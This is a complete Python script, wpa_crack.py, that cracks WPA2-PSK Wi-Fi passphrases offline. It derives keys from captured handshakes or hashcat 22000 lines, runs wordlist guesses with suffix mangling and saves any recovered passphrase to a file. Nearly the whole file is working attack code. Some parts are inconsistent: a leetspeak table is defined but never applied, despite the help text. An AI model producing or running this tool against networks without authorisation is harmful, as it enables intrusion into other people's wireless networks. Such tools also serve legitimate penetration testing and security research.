#!/usr/bin/env python3
"""wpa_crack.py — verify/crack a WPA2-PSK handshake extracted by cap_analyze.py.

Pure stdlib (hashlib + hmac): PBKDF2-HMAC-SHA1, the 802.11i PRF, KCK, and the
EAPOL-Key MIC check. Slow on purpose-built hardware but fast enough for
targeted wordlists and it needs no aircrack-ng/hashcat install.

Usage
    # crack with a wordlist (+ light mangling rules)
    python3 wpa_crack.py deadbeef

    # a single candidate
    python3 wpa_crack.py --pass 'MyPassword123'

    # validate the implementation against published test vectors
    python3 wpa_crack.py --selftest

    # benchmark this machine
    python3 wpa_crack.py --bench 500

Exit codes: 0 = cracked/found, 3 = exhausted without a match, 1 = usage error.
"""

from __future__ import annotations

import argparse
import binascii
import hashlib
import hmac
import json
import os
import struct
import sys
import time

# ---------------------------------------------------------------------------
# 802.11i key derivation
# ---------------------------------------------------------------------------

def pmk_from_passphrase(passphrase: str, ssid: bytes) -> bytes:
    """PBKDF2-HMAC-SHA1(passphrase, ssid, 4096, 32)."""
    return hashlib.pbkdf2_hmac("sha1", passphrase.encode("utf-8"), ssid, 4096, 32)


def prf_x(key: bytes, label: str, context: bytes, nbytes: int = 64) -> bytes:
    """IEEE 802.11i PRF-X (counter mode, HMAC-SHA1)."""
    out = b""
    i = 0
    lab = label.encode("ascii") + b"\x00"
    while len(out) < nbytes:
        out += hmac.new(key, lab + context + bytes([i]), hashlib.sha1).digest()
        i += 1
    return out[:nbytes]


def ptk_from(ssid: bytes, passphrase: str, ap: bytes, sta: bytes,
             anonce: bytes, snonce: bytes) -> bytes:
    """PTK (64 B) = PRF-512(PMK, "Pairwise key expansion", Min/Max(AA,SPA)||Min/Max(ANonce,SNonce))."""
    pmk = pmk_from_passphrase(passphrase, ssid)
    a = min(ap, sta) + max(ap, sta)
    n = min(anonce, snonce) + max(anonce, snonce)
    return prf_x(pmk, "Pairwise key expansion", a + n, 64)


def mic_of(eapol_hex: str, kck: bytes) -> str:
    """HMAC-SHA1(KCK, EAPOL frame with the MIC field zeroed)[:16]."""
    eap = bytearray(binascii.unhexlify(eapol_hex))
    eap[81:97] = b"\x00" * 16          # MIC field of an EAPOL-Key frame
    return hmac.new(kck, bytes(eap), hashlib.sha1).hexdigest()[:32]


def pmkid_of(ap: bytes, sta: bytes, pmk: bytes) -> str:
    return hmac.new(pmk, b"PMK Name" + ap + sta, hashlib.sha1).hexdigest()[:32]


def mac(s: str) -> bytes:
    return binascii.unhexlify(s.replace(":", ""))


# ---------------------------------------------------------------------------
# Handshake loading
# ---------------------------------------------------------------------------

def load_22000(path: str):
    """Parse hashcat -m 22000 lines back into handshake dicts."""
    items = []
    for line in open(path):
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        f = line.split("*")
        if len(f) != 10 or f[0] != "WPA" or f[1] != "02":
            raise ValueError("not a WPA*02* line: %s" % line[:40])
        items.append({
            "ssid": binascii.unhexlify(f[5]),
            "ap": mac(f[3]), "sta": mac(f[4]),
            "mic": f[2],
            "anonce": binascii.unhexlify(f[6]),
            "snonce": binascii.unhexlify(f[7]),
            "eapol": f[8],
            "anonce_source": f[9],
        })
    return items


def load(path: str):
    """Return every extracted handshake candidate for the first network."""
    d = json.load(open(path))
    items = []
    for hs in d["handshakes"]:
        items.append({
            "ssid": d["ssid"].encode(),
            "ap": mac(hs["ap"]),
            "sta": mac(hs["sta"]),
            "anonce": binascii.unhexlify(hs["anonce"]),
            "snonce": binascii.unhexlify(hs["snonce"]),
            "mic": hs["mic"],
            "eapol": hs["eapol"],
            "anonce_source": hs.get("anonce_source", "M1"),
        })
    return items


def m3_pair(hss_json_path: str):
    """Find the M3 frame belonging to the same station, for cross-checking."""
    d = json.load(open(hss_json_path))
    hs = d["handshakes"][0]
    if not hs.get("m3_mic"):
        return None
    return hs["sta"]


def check_one(handshake, passphrase: str) -> bool:
    try:
        ptk = ptk_from(handshake["ssid"], passphrase, handshake["ap"],
                       handshake["sta"], handshake["anonce"], handshake["snonce"])
    except Exception:
        return False
    return hmac.compare_digest(mic_of(handshake["eapol"], ptk[:16]), handshake["mic"])


def check(handshakes, passphrase: str) -> bool:
    return any(check_one(h, passphrase) for h in handshakes)


# ---------------------------------------------------------------------------
# Wordlist + mangling
# ---------------------------------------------------------------------------

LEET = str.maketrans("aeiost", "431057")
SUFFIX = ["", "0", "1", "12", "123", "1234", "12345", "123456", "!", "@", "#",
          "2024", "2025", "2026", "01", "07", "007", "69", "11"]


def variants(word: str):
    w = word
    for s in SUFFIX:
        yield w + s
        yield w.capitalize() + s
        yield w.upper() + s


def gen(paths):
    for p in paths:
        with open(p, "r", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    yield line


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("handshake", nargs="?", default="out/handshake.json")
    ap.add_argument("--pass", dest="single")
    ap.add_argument("--wordlist", action="append", default=None)
    ap.add_argument("--from-22000", dest="f22000", help="crack a hashcat -m 22000 file instead of handshake.json")
    ap.add_argument("--rules", action="store_true", help="apply suffix/leetspeak mangling")
    ap.add_argument("--selftest", action="store_true")
    ap.add_argument("--bench", type=int, default=0)
    a = ap.parse_args()

    if a.selftest:
        return selftest()

    hs = load_22000(a.f22000) if a.f22000 else load(a.handshake)

    if a.single:
        ok = check(hs, a.single)
        print("%s  <- %r" % ("CRACKED" if ok else "no match", a.single))
        return 0 if ok else 3

    if a.bench:
        t0 = time.time()
        for i in range(a.bench):
            check(hs, "bench%d" % i)
        dt = time.time() - t0
        print("%d candidates in %.2fs = %.0f PMK/s (single core)" % (a.bench, dt, a.bench / dt))
        return 0

    wl = a.wordlist or ["wordlists/candidates.txt"]
    print("verifying %d handshake candidate(s) for SSID %r"
          % (len(hs), hs[0]["ssid"].decode()), file=sys.stderr)
    n = 0
    t0 = time.time()
    for word in gen(wl):
        cands = variants(word) if a.rules else (word,)
        for c in cands:
            n += 1
            if check(hs, c):
                dt = time.time() - t0
                print("CRACKED  SSID=%r  passphrase=%r  (%d candidates, %.1fs, %.0f/s)"
                      % (hs[0]["ssid"].decode(), c, n, dt, n / dt))
                os.makedirs("out", exist_ok=True)
                with open("out/RECOVERED.txt", "w") as f:
                    f.write("ssid=%s\npsk=%s\n" % (hs[0]["ssid"].decode(), c))
                return 0
        if n % 500 == 0:
            print("  ... %d candidates, %.0f/s" % (n, n / max(time.time() - t0, 1e-9)),
                  file=sys.stderr)
    print("exhausted %d candidates, no match" % n)
    return 3


# ---------------------------------------------------------------------------
# Self-test: published vectors (independent implementations)
# ---------------------------------------------------------------------------

def selftest():
    ok = True

    def chk(name, got, want):
        nonlocal ok
        good = got == want
        ok &= good
        print("  [%s] %-42s %s" % ("PASS" if good else "FAIL", name, got[:48]))

    # 1. PBKDF2 vector: SSID "IEEE", passphrase "password" (802.11i / hostapd)
    chk("PBKDF2 ssid=IEEE pass=password",
        pmk_from_passphrase("password", b"IEEE").hex(),
        "f42c6fc52df0ebef9ebb4b90b38a5f902e83fe1b135a70e23aed762e9710a12e")

    # 2. PMKID vector from hashcat module_22000.c (ST_HASH / ST_PASS)
    #    WPA*01*4d4fe7aa...*fc690c158264*f4747f87f9f4*686173686361742d6573736964
    pmk = pmk_from_passphrase("hashcat!", b"hashcat-essid")
    chk("PMKID hashcat!/hashcat-essid",
        pmkid_of(mac("fc690c158264"), mac("f4747f87f9f4"), pmk),
        "4d4fe7aac3a2cecab195321ceb99a7d0")

    # 3. Full 4-way: MAC ORDER still needs a known capture, run separately:
    #    crack test/testm1m2m3.pcap (aircrack-ng suite) and compare.
    if os.path.exists(SELFTEST_CAP):
        import subprocess
        tmp = "out/_selftest"
        os.makedirs(tmp, exist_ok=True)
        subprocess.run([sys.executable, "cap_analyze.py", SELFTEST_CAP, "--hashcat",
                        "--outdir", tmp], check=False, stdout=subprocess.DEVNULL)
        hs = load(os.path.join(tmp, "handshake.json"))
        hit = None
        for w in gen([SELFTEST_WL]):
            if check(hs, w):
                hit = w
                break
        chk("4-way handshake %s -> %r" % (os.path.basename(SELFTEST_CAP), hit),
            "cracked" if hit else "not found", "cracked")

    print("\nSELFTEST %s" % ("OK" if ok else "FAILED"))
    return 0 if ok else 1


SELFTEST_CAP = os.path.join(os.path.dirname(os.path.abspath(__file__)), "testvec", "testm1m2m3.pcap")
SELFTEST_WL = os.path.join(os.path.dirname(os.path.abspath(__file__)), "testvec", "password.lst")


if __name__ == "__main__":
    sys.exit(main())
